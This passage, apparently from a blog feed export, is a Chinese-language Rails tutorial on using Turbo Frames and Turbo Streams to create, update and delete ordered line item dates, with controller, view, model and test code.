                <span class="token symbol">class</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"btn btn--primary"</span></span> <span class="token string-literal"><span class="token string">%>
  &lt;/div></span></span>

  <span class="token operator">&lt;</span><span class="token operator">%=</span> turbo_frame_tag <span class="token class-name">LineItemDate</span><span class="token punctuation">.</span><span class="token keyword">new</span> <span class="token string-literal"><span class="token string">%>
  &lt;%= render @line_item_dates, quote: @quote %></span></span>
<span class="token operator">&lt;</span><span class="token operator">/</span>main<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>现在使用相同的Turbo Frame id的标签嵌套我们的表单</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token operator">&lt;</span><span class="token operator">%</span><span class="token comment"># app/views/line_item_dates/new.html.erb %></span>

<span class="token operator">&lt;</span>main <span class="token keyword">class</span><span class="token operator">=</span><span class="token string-literal"><span class="token string">"container"</span></span><span class="token operator">></span>
  <span class="token operator">&lt;</span><span class="token operator">%=</span> link_to sanitize<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"&amp;larr; Back to quote"</span></span><span class="token punctuation">)</span><span class="token punctuation">,</span> quote_path<span class="token punctuation">(</span><span class="token variable">@quote</span><span class="token punctuation">)</span> <span class="token string-literal"><span class="token string">%>

  &lt;div class="header"></span></span>
    <span class="token operator">&lt;</span>h1<span class="token operator">></span>New date<span class="token operator">&lt;</span><span class="token operator">/</span>h1<span class="token operator">></span>
  <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>

  <span class="token operator">&lt;</span><span class="token operator">%=</span> turbo_frame_tag <span class="token variable">@line_item_date</span> <span class="token keyword">do</span> <span class="token string-literal"><span class="token string">%>
    &lt;%= render "form", quote: @quote, line_item_date: @line_item_date %></span></span>
  <span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token keyword">end</span> <span class="token string-literal"><span class="token string">%>
&lt;/main></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>现在当点击新建按钮时，表单就出现在<code>Quotes#show</code>页面了</p>
<p>当我们表单提交异常时，异常信息也以预期方式展示了，这是因为<code>LineItemDates</code>Controller在提交异常时，渲染了<code>LineItemDate#new</code>视图，而表单中的Turbo Frame id和渲染页面包含的Turbo Frame拥有相同的<code>new_line_item_date</code>id，Turbo智能的进行替换，如我们前面章节讨论的，如果表单提交异常，这应该使用<code>unprocessable_entity</code>状态去展示异常数据</p>
<p>当我们表单提交无误时，使用id为<code>new_line_itme_date</code>的Turbo Frame嵌套的表单和重定向响应的<code>Quotes#show</code>页面中的空Turbo Frame拥有相同的ID，所以表单就被空的Turbo Frame替换掉了，但刚刚创建的数据也没有展示啊，这是因为Turbo唔知道我们要怎么处理这部分数据，为了完成我们的需求，我们需要创建一个<code>craete_turbo_stream.erb</code>模板去控制Turbo完成以下行为：</p>
<ol>
<li>使用空Turbo Frame替换id为<code>new_line_item_date</code>的turbo frame</li>
<li>添加新建的line item date到表单中，并放在恰当的位置</li>
</ol>
<p>第一步和我们之前做的一样，第二步就有点儿复杂了，事实上，如果想要插入新建数据到正确的位置上，那我们必须得知道新建数据在排序队列中应在的位置，让我们看看怎么解决它，首先，编辑<code>LineItemDatesController#create</code>action去响应到<code>turbo_stream</code>format中。</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># app/controllers/line_item_dates_controller.rb</span>

<span class="token keyword">class</span> <span class="token class-name">LineItemDatesController</span> <span class="token operator">&lt;</span> ApplicationController
  <span class="token comment"># All the previous code...</span>

  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">create</span></span>
    <span class="token variable">@line_item_date</span> <span class="token operator">=</span> <span class="token variable">@quote</span><span class="token punctuation">.</span>line_item_dates<span class="token punctuation">.</span>build<span class="token punctuation">(</span>line_item_date_params<span class="token punctuation">)</span>

    <span class="token keyword">if</span> <span class="token variable">@line_item_date</span><span class="token punctuation">.</span>save
      respond_to <span class="token keyword">do</span> <span class="token operator">|</span>format<span class="token operator">|</span>
        format<span class="token punctuation">.</span>html <span class="token punctuation">&#123;</span> redirect_to quote_path<span class="token punctuation">(</span><span class="token variable">@quote</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token symbol">notice</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"Date was successfully created."</span></span> <span class="token punctuation">&#125;</span>
        format<span class="token punctuation">.</span>turbo_stream <span class="token punctuation">&#123;</span> flash<span class="token punctuation">.</span>now<span class="token punctuation">[</span><span class="token symbol">:notice</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string-literal"><span class="token string">"Date was successfully created."</span></span> <span class="token punctuation">&#125;</span>
      <span class="token keyword">end</span>
    <span class="token keyword">else</span>
      render <span class="token symbol">:new</span><span class="token punctuation">,</span> <span class="token symbol">status</span><span class="token operator">:</span> <span class="token symbol">:unprocessable_entity</span>
    <span class="token keyword">end</span>
  <span class="token keyword">end</span>

  <span class="token comment"># All the previous code...</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>现在让我们想想要实现什么？我们想要插入新建数据到排序列表中正确的位置上，并以从小到大的顺序进行排列，也就是说如果我们的quote已经有了一些数据在新数据的前面，我们新数据就应该放到最后一个，否则，我们应该把数据放到列表的最前面。</p>
<p>在Turbo Stream view里敲代码吧</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token operator">&lt;</span><span class="token string-literal"><span class="token string">%# app/views/line_item_dates/create.turbo_stream.erb %>

&lt;%#</span></span> Step <span class="token number">1</span><span class="token operator">:</span> remove the form from the Quotes<span class="token comment">#index page %></span>
<span class="token operator">&lt;</span><span class="token operator">%=</span> turbo_stream<span class="token punctuation">.</span>update <span class="token class-name">LineItemDate</span><span class="token punctuation">.</span><span class="token keyword">new</span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">""</span></span> <span class="token string-literal"><span class="token string">%>

&lt;%# Step 2: add the date at the right place %></span></span>
<span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token keyword">if</span> previous_date <span class="token operator">=</span> <span class="token variable">@quote</span><span class="token punctuation">.</span>line_item_dates<span class="token punctuation">.</span>ordered<span class="token punctuation">.</span>where<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"date &lt; ?"</span></span><span class="token punctuation">,</span> <span class="token variable">@line_item_date</span><span class="token punctuation">.</span>date<span class="token punctuation">)</span><span class="token punctuation">.</span>last <span class="token string-literal"><span class="token string">%>
  &lt;%= turbo_stream.after previous_date do %></span></span>
    <span class="token operator">&lt;</span><span class="token operator">%=</span> render <span class="token variable">@line_item_date</span><span class="token punctuation">,</span> <span class="token symbol">quote</span><span class="token operator">:</span> <span class="token variable">@quote</span> <span class="token string-literal"><span class="token string">%>
  &lt;% end %></span></span>
<span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token keyword">else</span> <span class="token string-literal"><span class="token string">%>
  &lt;%= turbo_stream.prepend "line_item_dates" do %></span></span>
    <span class="token operator">&lt;</span><span class="token operator">%=</span> render <span class="token variable">@line_item_date</span><span class="token punctuation">,</span> <span class="token symbol">quote</span><span class="token operator">:</span> <span class="token variable">@quote</span> <span class="token string-literal"><span class="token string">%>
  &lt;% end %></span></span>
<span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token keyword">end</span> <span class="token string-literal"><span class="token string">%>

&lt;%= render_turbo_stream_flash_messages %></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这段代码之后我们就会进行优化，但现在让我们先知道做了什么。</p>
<p>第一步和以前一样，简单的用空Turbo Frame替换form</p>
<p>第二部分就有点儿复杂了，我们先检索新数据前面的数据，如果存在，我们将把新数据加到后面，如果没有，我们将新数据放到队列前面。</p>
<p>为了生效，我们需要把列表嵌套到id为<code>line_item_dates</code>的turbo frame tag中，方便可以把数据加到最前面。</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token operator">&lt;</span><span class="token string-literal"><span class="token string">%# app/views/quotes/show.html.erb %>

&lt;%#</span></span> All the previous code<span class="token operator">...</span> <span class="token string-literal"><span class="token string">%>

&lt;%= turbo_frame_tag "line_item_dates" do %></span></span>
  <span class="token operator">&lt;</span><span class="token operator">%=</span> render <span class="token variable">@line_item_dates</span><span class="token punctuation">,</span> <span class="token symbol">quote</span><span class="token operator">:</span> <span class="token variable">@quote</span> <span class="token string-literal"><span class="token string">%>
&lt;% end %></span></span>

<span class="token operator">&lt;</span><span class="token operator">%</span><span class="token comment"># All the previous code... %></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>我们也必须包裹每个独立的line item到<code>turbo_frame_tag</code>中，这是因为我们需要通过独立的ID辨别每条独立的Line item，因为我们需要给中间插数据。</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token operator">&lt;</span><span class="token operator">%</span><span class="token comment"># app/views/line_item_dates/_line_item_date.html.erb %></span>

<span class="token operator">&lt;</span><span class="token operator">%=</span> turbo_frame_tag line_item_date <span class="token keyword">do</span> <span class="token string-literal"><span class="token string">%>
  &lt;div class="line-item-date"></span></span>
    <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">-</span><span class="token operator">-</span> All the previous code <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">></span>
  <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>
<span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token keyword">end</span> <span class="token operator">%</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>让我们在浏览器中测试一下吧，正常工作了。让我们重构一下之前的代码，并加上一些测试。首先我们需要抽离前面的数据逻辑到<code>LineItemDate</code>模型中。</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># app/models/line_item_date.rb</span>

<span class="token keyword">class</span> <span class="token class-name">LineItemDate</span> <span class="token operator">&lt;</span> ApplicationRecord
  <span class="token comment"># All the previous code...</span>

  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">previous_date</span></span>
    quote<span class="token punctuation">.</span>line_item_dates<span class="token punctuation">.</span>ordered<span class="token punctuation">.</span>where<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"date &lt; ?"</span></span><span class="token punctuation">,</span> date<span class="token punctuation">)</span><span class="token punctuation">.</span>last
  <span class="token keyword">end</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>现在替换视图中这部分逻辑</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token operator">&lt;</span><span class="token string-literal"><span class="token string">%# app/views/line_item_dates/create.turbo_stream.erb %>

&lt;%#</span></span> Step <span class="token number">1</span><span class="token operator">:</span> remove the form from the Quotes<span class="token comment">#index page %></span>
<span class="token operator">&lt;</span><span class="token operator">%=</span> turbo_stream<span class="token punctuation">.</span>update <span class="token class-name">LineItemDate</span><span class="token punctuation">.</span><span class="token keyword">new</span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">""</span></span> <span class="token string-literal"><span class="token string">%>

&lt;%# Step 2: add the date at the right place %></span></span>
<span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token keyword">if</span> previous_date <span class="token operator">=</span> <span class="token variable">@line_item_date</span><span class="token punctuation">.</span>previous_date <span class="token string-literal"><span class="token string">%>
  &lt;%= turbo_stream.after previous_date do %></span></span>
    <span class="token operator">&lt;</span><span class="token operator">%=</span> render <span class="token variable">@line_item_date</span><span class="token punctuation">,</span> <span class="token symbol">quote</span><span class="token operator">:</span> <span class="token variable">@quote</span> <span class="token string-literal"><span class="token string">%>
  &lt;% end %></span></span>
<span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token keyword">else</span> <span class="token string-literal"><span class="token string">%>
  &lt;%= turbo_stream.prepend "line_item_dates" do %></span></span>
    <span class="token operator">&lt;</span><span class="token operator">%=</span> render <span class="token variable">@line_item_date</span><span class="token punctuation">,</span> <span class="token symbol">quote</span><span class="token operator">:</span> <span class="token variable">@quote</span> <span class="token string-literal"><span class="token string">%>
  &lt;% end %></span></span>
<span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token keyword">end</span> <span class="token string-literal"><span class="token string">%>

&lt;%= render_turbo_stream_flash_messages %></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>加入测试</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># test/models/line_item_date_test.rb</span>

<span class="token keyword">require</span> <span class="token string-literal"><span class="token string">"test_helper"</span></span>

<span class="token keyword">class</span> <span class="token class-name">LineItemDateTest</span> <span class="token operator">&lt;</span> ActiveSupport<span class="token double-colon punctuation">::</span>TestCase
  test <span class="token string-literal"><span class="token string">"#previous_date returns the quote's previous date when it exitsts"</span></span> <span class="token keyword">do</span>
    assert_equal line_item_dates<span class="token punctuation">(</span><span class="token symbol">:today</span><span class="token punctuation">)</span><span class="token punctuation">,</span> line_item_dates<span class="token punctuation">(</span><span class="token symbol">:next_week</span><span class="token punctuation">)</span><span class="token punctuation">.</span>previous_date
  <span class="token keyword">end</span>

  test <span class="token string-literal"><span class="token string">"#previous_date returns nil when the quote has no previous date"</span></span> <span class="token keyword">do</span>
    assert_nil line_item_dates<span class="token punctuation">(</span><span class="token symbol">:today</span><span class="token punctuation">)</span><span class="token punctuation">.</span>previous_date
  <span class="token keyword">end</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这是一个最小的测试了，但能给我们系统正常运转的信心。</p>
<p>工作量不算小啊，<code>#edit,#update and #destory</code>actions 我们也马上进行晚上。</p>
<h3 id="Updating-line-item-dates-with-Turbo"><a href="#Updating-line-item-dates-with-Turbo" class="headerlink" title="Updating line item dates with Turbo"></a>Updating line item dates with Turbo</h3><p>如<code>#new and #create</code>actions一样，我们想要<code>#edit and #update</code>也能在<code>Quotes#show</code>页面，而我们已经把<code>Quotes#show</code>页面的数据用Turbo Frames嵌套了，如下面草图所示：</p>
<p><img src="../../../../public/img/image-20230627105453133.png" alt="image-20230627105453133"></p>
<p>当点击编辑图中id为<code>line_item_date_3</code>的Turbo Frame时，Turbo会去到<code>LineItemDates#edit</code>页面去找对应的Turbo Frame，像下图</p>
<p><img src="../../../../public/img/image-20230627105632515.png" alt="image-20230627105632515"></p>
<p>这样就可以用<code>LineItemDates#edit</code>页面中的表单替换掉<code>Quotes#show</code>页面中的数据了。</p>
<p><img src="../../../../public/img/image-20230627105749302.png" alt="image-20230627105749302"></p>
<p>当提交表单时，我们又遇到了<code>#new and #create</code>操作时遇到的问题，如何插入被修改的数据，到正确的位置上。而我们也会用同样的方式，如<code>create.turbo_stream.erb</code>页面。我们会先删除操作的数据，然后再把他插入到正确的位置。如下面的草图。</p>
<p><img src="../../../../public/img/image-20230627110423339.png" alt="image-20230627110423339"></p>
<p><code>Quotes#show</code>页面最终的状态，应该拥有排序后的数据</p>
<p><img src="../../../../public/img/image-20230627110544390.png" alt="image-20230627110544390"></p>
<p>理清需求了，敲代码吧，工作的第一部分是让编辑表单成功替换到<code>Quotes#show</code>页面，而我们只需要用Turbo Frame嵌套到<code>LineItemDate#edit</code>上</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token operator">&lt;</span><span class="token operator">%</span><span class="token comment"># app/views/line_item_dates/edit.html.erb %></span>

<span class="token operator">&lt;</span>main <span class="token keyword">class</span><span class="token operator">=</span><span class="token string-literal"><span class="token string">"container"</span></span><span class="token operator">></span>
  <span class="token operator">&lt;</span><span class="token operator">%=</span> link_to sanitize<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"&amp;larr; Back to quote"</span></span><span class="token punctuation">)</span><span class="token punctuation">,</span> quote_path<span class="token punctuation">(</span><span class="token variable">@quote</span><span class="token punctuation">)</span> <span class="token string-literal"><span class="token string">%>

  &lt;div class="header"></span></span>
    <span class="token operator">&lt;</span>h1<span class="token operator">></span>Edit date<span class="token operator">&lt;</span><span class="token operator">/</span>h1<span class="token operator">></span>
  <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>

  <span class="token operator">&lt;</span><span class="token operator">%=</span> turbo_frame_tag <span class="token variable">@line_item_date</span> <span class="token keyword">do</span> <span class="token string-literal"><span class="token string">%>
    &lt;%= render "form", quote: @quote, line_item_date: @line_item_date %></span></span>
  <span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token keyword">end</span> <span class="token string-literal"><span class="token string">%>
&lt;/main></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>去浏览器测测看吧</p>
<p>如果表单提交异常，也能正常工作，如果表单正常提交，修改数据被成功替换，但并没有把数据放到正确的位置上。为了确保数据在正常的位置上，我们要用Turbo Stream view，就像我们之前操作<code>#create</code>一样，先允许Controller去渲染Turbo Stream view</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># app/controllers/line_item_dates_controller.rb</span>

<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">update</span></span>
  <span class="token keyword">if</span> <span class="token variable">@line_item_date</span><span class="token punctuation">.</span>update<span class="token punctuation">(</span>line_item_date_params<span class="token punctuation">)</span>
    respond_to <span class="token keyword">do</span> <span class="token operator">|</span>format<span class="token operator">|</span>
      format<span class="token punctuation">.</span>html <span class="token punctuation">&#123;</span> redirect_to quote_path<span class="token punctuation">(</span><span class="token variable">@quote</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token symbol">notice</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"Date was successfully updated."</span></span> <span class="token punctuation">&#125;</span>
      format<span class="token punctuation">.</span>turbo_stream <span class="token punctuation">&#123;</span> flash<span class="token punctuation">.</span>now<span class="token punctuation">[</span><span class="token symbol">:notice</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string-literal"><span class="token string">"Date was successfully updated."</span></span> <span class="token punctuation">&#125;</span>
    <span class="token keyword">end</span>
  <span class="token keyword">else</span>
    render <span class="token symbol">:edit</span><span class="token punctuation">,</span> <span class="token symbol">status</span><span class="token operator">:</span> <span class="token symbol">:unprocessable_entity</span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>现在创建<code>update.turbo_stream.erb</code>，还是和之前一样的逻辑</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token operator">&lt;</span><span class="token string-literal"><span class="token string">%# app/views/line_item_dates/update.turbo_stream.erb %>

&lt;%#</span></span> Step <span class="token number">1</span><span class="token operator">:</span> remove the form <span class="token string-literal"><span class="token string">%>
&lt;%= turbo_stream.remove @line_item_date %></span></span>

<span class="token operator">&lt;</span><span class="token operator">%</span><span class="token comment"># Step 2: insert the updated date at the correct position %></span>
<span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token keyword">if</span> previous_date <span class="token operator">=</span> <span class="token variable">@line_item_date</span><span class="token punctuation">.</span>previous_date <span class="token string-literal"><span class="token string">%>
  &lt;%= turbo_stream.after previous_date do %></span></span>
    <span class="token operator">&lt;</span><span class="token operator">%=</span> render <span class="token variable">@line_item_date</span><span class="token punctuation">,</span> <span class="token symbol">quote</span><span class="token operator">:</span> <span class="token variable">@quote</span> <span class="token string-literal"><span class="token string">%>
  &lt;% end %></span></span>
<span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token keyword">else</span> <span class="token string-literal"><span class="token string">%>
  &lt;%= turbo_stream.prepend "line_item_dates" do %></span></span>
    <span class="token operator">&lt;</span><span class="token operator">%=</span> render <span class="token variable">@line_item_date</span><span class="token punctuation">,</span> <span class="token symbol">quote</span><span class="token operator">:</span> <span class="token variable">@quote</span> <span class="token string-literal"><span class="token string">%>
  &lt;% end %></span></span>
<span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token keyword">end</span> <span class="token string-literal"><span class="token string">%>

&lt;%= render_turbo_stream_flash_messages %></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>去浏览器试试看吧</p>
<h3 id="Destroying-line-item-dates-with-Turbo"><a href="#Destroying-line-item-dates-with-Turbo" class="headerlink" title="Destroying line item dates with Turbo"></a>Destroying line item dates with Turbo</h3><p>最后我们来完成删除Line item dates的工作，先让<code>#destory</code>支持Turbo Stream format</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># app/controllers/line_item_dates_controller.rb</span>

<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">destroy</span></span>
  <span class="token variable">@line_item_date</span><span class="token punctuation">.</span>destroy

  respond_to <span class="token keyword">do</span> <span class="token operator">|</span>format<span class="token operator">|</span>
    format<span class="token punctuation">.</span>html <span class="token punctuation">&#123;</span> redirect_to quote_path<span class="token punctuation">(</span><span class="token variable">@quote</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token symbol">notice</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"Date was successfully destroyed."</span></span> <span class="token punctuation">&#125;</span>
    format<span class="token punctuation">.</span>turbo_stream <span class="token punctuation">&#123;</span> flash<span class="token punctuation">.</span>now<span class="token punctuation">[</span><span class="token symbol">:notice</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string-literal"><span class="token string">"Date was successfully destroyed."</span></span> <span class="token punctuation">&#125;</span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>然后再删除line item date并且渲染flash message</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token operator">&lt;</span><span class="token operator">%</span><span class="token comment"># app/views/line_item_dates/destroy.turbo_stream.erb %></span>

<span class="token operator">&lt;</span><span class="token operator">%=</span> turbo_stream<span class="token punctuation">.</span>remove <span class="token variable">@line_item_date</span> <span class="token string-literal"><span class="token string">%>
&lt;%= render_turbo_stream_flash_messages %></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>去浏览器试试吧</p>
<h3 id="Testing-our-code-with-system-tests"><a href="#Testing-our-code-with-system-tests" class="headerlink" title="Testing our code with system tests"></a>Testing our code with system tests</h3><p>如果我们有没有添加测试，那工作是不完整的，我们应该总是写一些测试来保证上线前发现问题，并进行修复。</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># test/system/line_item_dates_test.rb</span>

<span class="token keyword">require</span> <span class="token string-literal"><span class="token string">"application_system_test_case"</span></span>

<span class="token keyword">class</span> <span class="token class-name">LineItemDatesTest</span> <span class="token operator">&lt;</span> ApplicationSystemTestCase
  setup <span class="token keyword">do</span>
    login_as users<span class="token punctuation">(</span><span class="token symbol">:accountant</span><span class="token punctuation">)</span>

    <span class="token variable">@quote</span>          <span class="token operator">=</span> quotes<span class="token punctuation">(</span><span class="token symbol">:first</span><span class="token punctuation">)</span>
    <span class="token variable">@line_item_date</span> <span class="token operator">=</span> line_item_dates<span class="token punctuation">(</span><span class="token symbol">:today</span><span class="token punctuation">)</span>

    visit quote_path<span class="token punctuation">(</span><span class="token variable">@quote</span><span class="token punctuation">)</span>
  <span class="token keyword">end</span>

  test <span class="token string-literal"><span class="token string">"Creating a new line item date"</span></span> <span class="token keyword">do</span>
    assert_selector <span class="token string-literal"><span class="token string">"h1"</span></span><span class="token punctuation">,</span> <span class="token symbol">text</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"First quote"</span></span>

    click_on <span class="token string-literal"><span class="token string">"New date"</span></span>
    assert_selector <span class="token string-literal"><span class="token string">"h1"</span></span><span class="token punctuation">,</span> <span class="token symbol">text</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"First quote"</span></span>
    fill_in <span class="token string-literal"><span class="token string">"Date"</span></span><span class="token punctuation">,</span> <span class="token symbol">with</span><span class="token operator">:</span> Date<span class="token punctuation">.</span>current <span class="token operator">+</span> <span class="token number">1.</span>day

    click_on <span class="token string-literal"><span class="token string">"Create date"</span></span>
    assert_text I18n<span class="token punctuation">.</span>l<span class="token punctuation">(</span>Date<span class="token punctuation">.</span>current <span class="token operator">+</span> <span class="token number">1.</span>day<span class="token punctuation">,</span> <span class="token symbol">format</span><span class="token operator">:</span> <span class="token symbol">:long</span><span class="token punctuation">)</span>
  <span class="token keyword">end</span>

  test <span class="token string-literal"><span class="token string">"Updating a line item date"</span></span> <span class="token keyword">do</span>
    assert_selector <span class="token string-literal"><span class="token string">"h1"</span></span><span class="token punctuation">,</span> <span class="token symbol">text</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"First quote"</span></span>

    within id<span class="token operator">:</span> dom_id<span class="token punctuation">(</span><span class="token variable">@line_item_date</span><span class="token punctuation">)</span> <span class="token keyword">do</span>
      click_on <span class="token string-literal"><span class="token string">"Edit"</span></span>
    <span class="token keyword">end</span>

    assert_selector <span class="token string-literal"><span class="token string">"h1"</span></span><span class="token punctuation">,</span> <span class="token symbol">text</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"First quote"</span></span>

    fill_in <span class="token string-literal"><span class="token string">"Date"</span></span><span class="token punctuation">,</span> <span class="token symbol">with</span><span class="token operator">:</span> Date<span class="token punctuation">.</span>current <span class="token operator">+</span> <span class="token number">1.</span>day
    click_on <span class="token string-literal"><span class="token string">"Update date"</span></span>

    assert_text I18n<span class="token punctuation">.</span>l<span class="token punctuation">(</span>Date<span class="token punctuation">.</span>current <span class="token operator">+</span> <span class="token number">1.</span>day<span class="token punctuation">,</span> <span class="token symbol">format</span><span class="token operator">:</span> <span class="token symbol">:long</span><span class="token punctuation">)</span>
  <span class="token keyword">end</span>

  test <span class="token string-literal"><span class="token string">"Destroying a line item date"</span></span> <span class="token keyword">do</span>
    assert_text I18n<span class="token punctuation">.</span>l<span class="token punctuation">(</span>Date<span class="token punctuation">.</span>current<span class="token punctuation">,</span> <span class="token symbol">format</span><span class="token operator">:</span> <span class="token symbol">:long</span><span class="token punctuation">)</span>

    accept_confirm <span class="token keyword">do</span>
      within id<span class="token operator">:</span> dom_id<span class="token punctuation">(</span><span class="token variable">@line_item_date</span><span class="token punctuation">)</span> <span class="token keyword">do</span>
        click_on <span class="token string-literal"><span class="token string">"Delete"</span></span>
      <span class="token keyword">end</span>
    <span class="token keyword">end</span>

    assert_no_text I18n<span class="token punctuation">.</span>l<span class="token punctuation">(</span>Date<span class="token punctuation">.</span>current<span class="token punctuation">,</span> <span class="token symbol">format</span><span class="token operator">:</span> <span class="token symbol">:long</span><span class="token punctuation">)</span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>上面我们加入了测试增删改,针对line item date，我们使用<code>bin/rails test:all</code>指令，来同时运行单元测试和系统测试。</p>
<h2 id="Wrap-up"><a href="#Wrap-up" class="headerlink" title="Wrap up"></a>Wrap up</h2><p>本章节中，我们做了另一个资源的增删改查操作，与之前不同的是，我们需要保证数据的有序性，通过<code>turbo_stream.after</code>来保证正确位置的插入局部模板到DOM中。</p>
<p>另外我们通过<form>中的<code>data-turbo-confirm</code>参数来弹出弹框，保证不会误删。</p>
<p>下一章是最后一个大章节，我们将讨论 nested Turbo Frames。</p>
]]></content>
      <categories>
        <category>Turbo-Rails</category>
      </categories>
      <tags>
        <tag>Rails</tag>
        <tag>turbo</tag>
      </tags>
  </entry>
  <entry>
    <title>面向对象的演化过程和解决问题</title>
    <url>//post/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%9A%84%E6%BC%94%E5%8C%96%E8%BF%87%E7%A8%8B%E5%92%8C%E8%A7%A3%E5%86%B3%E9%97%AE%E9%A2%98.html</url>
